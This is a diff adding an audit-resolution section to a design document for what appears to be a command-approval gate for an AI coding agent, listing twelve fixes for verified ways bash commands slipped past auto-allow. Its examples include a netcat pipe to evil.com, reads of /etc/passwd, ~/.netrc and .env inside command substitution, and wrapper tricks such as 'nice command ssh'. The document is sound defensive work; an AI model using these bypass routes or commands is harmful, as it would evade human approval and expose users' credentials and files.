@@ -1356,3 +1356,101 @@ class"). Suite 3229.
     flow + dir-granted file writes), armed with stop-tag + deny-kind data —
     D4 changes what the user *doesn't see*, so it goes live last, with
     numbers.
+
+## 6. Round-6 audit grill — resolved decisions (2026-10-17)
+
+**Status: DECIDED, NOT BUILT.** Resolved by grilling the 2026-10-17 handoff
+audit (Joplin note `67dc875e13594e61b8083dd275924487`) against `3.37.1`
+(`8e57693`). Its own baseline was `3.32.0` — a stale, gitless Mac copy — so its
+reproducers were re-run at HEAD first: 37 of 60 manual rows still auto-allow,
+the rest were closed by 3.33–3.37. Each release below carries its rows as
+`not auto-allow` contract tests in `test/verified-bypasses.test.ts`.
+
+1. **G1 — pipe stages become real `BashSegment`s on the segment** (parser-built
+   `segment.stages`), not a per-consumer `splitOnPipe` patch and not a flatten
+   into the global segment list. *Why:* pipeline blindness is a recurring class,
+   not ten separate bugs — `segment-analysis.ts` already re-runs the evaluators
+   over a hand-built `pseudoSeg` per stage, and the comment there records the
+   2026-08-24 incident (`ls | bash /any/script` auto-allowed). Consumer-side
+   splitting re-creates that drift. *Why not flattening:* every index-keyed
+   structure (`effectiveCwds`, `relativeToolIds`, `nonAllowedSegmentIndices`,
+   ungrantable-run-dep sets) would renumber — new holes, not a refactor.
+2. **G2 — the grant unit is the stage.** Every stage must be on the allow table
+   or covered by its own signature grant, exactly like a `&&` / `;` list item.
+   `ls | wc -l` still auto-allows; `ls | nc evil.com 4444` prompts for the `nc`
+   stage. Today the signature is stage 0, so an `ls` grant covers the pipe.
+3. **G3 — manual mode gets a real WRITE bar for bash.** `analysis.writePaths`
+   (output redirects, `rm`/`mv`/`cp`/`tee`/`sed -i`/`truncate`/`patch` targets,
+   `sort -o`, write-capable code bodies) is checked against cwd ∪
+   `allowedWritePaths`; a READ grant never satisfies a write. Closes Tension 2:
+   the File policy separates the bars, `decideBash` never did — verified live:
+   `mkdir ~/.pi/agent/…` and `touch ~/.pi/agent/…` auto-allow because `~/.pi` is
+   an `allowedReadPath`. The `mkdir`/`touch`/`mktemp` carve-out stays, but is
+   location-scoped.
+4. **G4 — path-qualified `argv0`: system dirs or path operand.** An `argv0`
+   whose dir realpaths into a fixed system set keeps bare-name semantics; any
+   other `/`-containing `argv0` (relative *or* absolute) is extracted as a path
+   operand — its directory faces the read bar — and matches only an exact,
+   base-bound grant, never a basename against the allow table. Closes
+   `bin/ls`, `~/Downloads/ls`, `/tmp/evil/git status`, `node_modules/.bin/tsc`;
+   `RELATIVE_PATH_RE` (`./`, `../` only) is why the existing relative-tool
+   base-binding never saw `bin/ls`.
+5. **G5 — substitution bodies are analyzed as stages.** The parser already
+   extracts them into `BashSegment.subshellTexts`; feed those through the same
+   per-stage analysis with the parent's effective base, and make
+   `READONLY_SUBSHELL_CMDS` flag-aware (`fd -x`, `rg --pre`) and drop `cd`.
+   `architecture.md`'s Command-substitution section already promises "the body's
+   own paths still get path checks" — the parser never delivered it
+   (`collectCommandNodes` returns at the outer `command`). Verified live:
+   `echo $(cat /etc/passwd)`, `"$(cat ~/.netrc)"`, `"$(cat .env)"`.
+6. **G6 — one shared fixpoint unwrapper, fail-closed at the cap.** Every
+   first-word consumer adopts it (signature, allow table, `baseAccessPath`,
+   `baseWriteAccess`, egress, the arg-index scanners that mint false
+   `<unresolved-var>` sentinels under `timeout`/`uv`). `checkExecWrite` and
+   `shellBodyWrites` move from `isAllowedCommand` (the auto-allow TABLE, which
+   contains write verbs) to `unconditionallySafeCommands`. Verified live:
+   `nice cat /etc/hosts`, `nice command ssh user@evil.com`,
+   `find . -exec git push \;`, `fd -x git clean -fdx`.
+7. **G7 — closed-world flag table on the trust path.** For a trusted-script or
+   package-run auto-allow, a flag is permitted only if the runner's table lists
+   it as benign; a flag that selects code/interpreter/index/env (`uv -w`,
+   `--project`, `--directory`, `--python`, `--env-file`, `npx -p/--package`,
+   `uvx --from`) has its value extracted and faces the existing dep-trust check;
+   an unresolvable value (`--python "$PY"`) marks the segment ungrantable.
+   Verified live: `uv run -w evil-pkg python3 <trusted script>` auto-allowed.
+8. **G8 — reversal, recorded: variable shadowing taints at the minting site.**
+   The 3.29.0 round deliberately did NOT record compound-body assignments
+   ("assumes the body ran" → fail-open). Reversed: a compound-body
+   reassignment of an already-assigned name makes the name taint-marked, and
+   where it would mint a location token it mints `<unresolved-var>` (stop).
+   Cost is bounded to commands where the shadowed var reaches a FILE-operand
+   position, so D15 loop in-list threading (`for f in a b; do cat $f; done`)
+   keeps converging. Verified live: `f=./safe.txt; (f=/etc/hosts; cat $f)`.
+9. **G9 — a confirmed resolution binds to (effective base, token)**, and a
+   one-shot "Yes" never persists one (only an explicit Always-tier choice).
+   `sanitizeDirs` runs `resolvePathReal` before the in-bar test — an
+   un-normalizable or escaping dir yields no resolution. Today the key is the
+   raw token, session-wide, so one `$d` answer authorizes an unrelated later
+   `for d in $(cat /tmp/targets.txt); do cat "$d"; done`.
+10. **G10 — tool grants are scoped by family.** A `file`-gate prompt's Always
+    grants that tool's file actions bound to a directory (File-policy bars + the
+    credential check run on tool paths); `exec` actions need
+    `<tool>:kind:exec`; in `/dspa`, an `exec` payload from a granted tool still
+    goes through floor + judge (`applyDspaConversions` covers tool requests).
+    The doc currently says `<tool>` = "whole tool (the Always on exec/file
+    prompts)" — a file prompt granting code execution, which contradicts the
+    same section's "a read consent can never cover exec".
+11. **G11 — `/dspat` agreement mirrors authority.** `suggestedApprove` = what
+    the running stage would actually have auto-allowed (stage 1 approve+low;
+    stage 2 approve+{low,medium}); `defer` and judge infra-failures leave the
+    denominator and surface separately. Today `approve === "approve"` counts
+    approve+high as agreement and `defer` as a denial — and this number is the
+    calibration data §5 Q10 says future widening must be armed with.
+12. **G12 — phasing.** 3.38.0 = the stage model (G1/G2/G5/G6) as one coherent
+    parse change; 3.39.0 = the bar model (G3) + `argv0` (G4) + flag tables
+    (G7); 3.39.x = grants/UI/judge (G8/G9/G10/G11) plus the independent
+    one-line surgical fixes (Write-prompt `Always` suppressed by a Read grant,
+    `retryJudge` skipping `judgeWriteOutside`, `isInsideCwd` not realpath-ing
+    `cwd`, `sanitizeDirs` normalization). A `/dspa` replay round runs after
+    3.38.0: the round-1–5 ledger corpus is gone (`DECISION_LOG_ENABLED = false`),
+    so the decision log gets enabled to rebuild it going forward.
